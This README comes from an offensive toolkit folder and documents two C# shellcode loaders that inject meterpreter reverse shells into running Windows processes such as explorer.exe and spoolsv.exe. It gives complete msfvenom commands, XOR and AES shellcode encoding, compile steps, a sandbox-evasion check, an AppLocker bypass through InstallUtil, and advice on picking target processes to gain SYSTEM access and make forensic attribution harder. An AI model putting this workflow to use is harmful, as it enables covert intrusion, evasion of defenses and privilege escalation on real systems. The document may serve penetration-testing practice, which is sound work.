# process-injection

Two files. Both **standalone** — pick one based on your environment. They inject shellcode into an **existing running process** (e.g. `explorer.exe`, `spoolsv.exe`) instead of running it in your own process.

**Why inject instead of run directly?**
- Your meterpreter session survives even if your loader dies
- The session appears to come from `explorer.exe` (or whichever process), not your binary
- Forensically harder to attribute

---

## File Roles

| File | Standalone? | When to use | AppLocker bypass? |
|------|-------------|-------------|-------------------|
| `basic-injection.cs` | Yes | No AppLocker restrictions | No |
| `clinject.cs` | Yes | AppLocker blocks your .exe | Yes (InstallUtil) |

---

## Injection Technique (both files use the same approach)

Classic remote thread injection:
```
OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
```
1. Open a handle to the target process
2. Allocate memory inside that process
3. Copy shellcode into that memory
4. Create a thread in the target process pointing at the shellcode

**Sandbox evasion:** Both files call `VirtualAllocExNuma()` first. This NT function only works on real hardware — sandbox VMs often return NULL. If it returns NULL, the loader exits silently.

---

## basic-injection.cs — No AppLocker

XOR-encoded shellcode (key `0xfa`). Target process is `explorer.exe` by default (or pass a PID/name as argument).

```bash
# 1. Generate shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f raw -o shell.bin

# 2. XOR encode
python3 04-encoders/xor/xor_encoder.py shell.bin 0xfa --format csharp

# 3. Paste into buf[] in basic-injection.cs

# 4. Compile — Visual Studio (Windows dev box)
#
#    File → New → Project → Console App (.NET Framework)
#    Name: "inject", Framework: .NET Framework 4.8
#    Paste basic-injection.cs contents, replace defaults
#    Project → Properties → Build:
#      Platform target: x64
#      ☑ Allow unsafe code
#    Build → Build Solution (Ctrl+Shift+B)
#    Output: bin\x64\Debug\inject.exe
#
#    Alt (Windows cmd): csc.exe /unsafe /platform:x64 /out:inject.exe basic-injection.cs

# 5. Run (inject into explorer.exe)
.\inject.exe
# Or specify a process:
.\inject.exe spoolsv.exe
```

---

## clinject.cs — AppLocker Bypass via InstallUtil

AES-encrypted shellcode. Uses placeholder IP trick — compile once with `11.11.11.11`, patch in real IP at runtime.

```bash
# 1. Generate with placeholder IP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=11.11.11.11 LPORT=4444 EXITFUNC=thread -f raw -o shell.bin

# 2. AES encrypt
python3 04-encoders/aes/shellcode_encoder.py shell.bin <PASSWORD> aes

# 3. Paste into buf[] in clinject.cs. Set PASSWORD and real LHOST/LPORT constants.

# 4. Compile — Visual Studio (Windows dev box)
#
#    File → New → Project → Console App (.NET Framework)
#    Name: "clinject", Framework: .NET Framework 4.8
#    Paste clinject.cs contents, replace defaults
#    Project → Properties → Build:
#      Platform target: x64
#      ☑ Allow unsafe code
#    Build → Build Solution (Ctrl+Shift+B)
#    Output: bin\x64\Debug\clinject.exe
#
#    Alt (Windows cmd): csc.exe /unsafe /platform:x64 /out:clinject.exe clinject.cs

# 5. Run via InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U clinject.exe
```

---

## Which process to inject into?

| Situation | Target process |
|-----------|---------------|
| Running as regular user | `explorer.exe` (always running as the logged-in user) |
| Running as admin | `spoolsv.exe` (runs as SYSTEM, gives you SYSTEM session) |
| Want something obscure | `svchost.exe`, `RuntimeBroker.exe` |
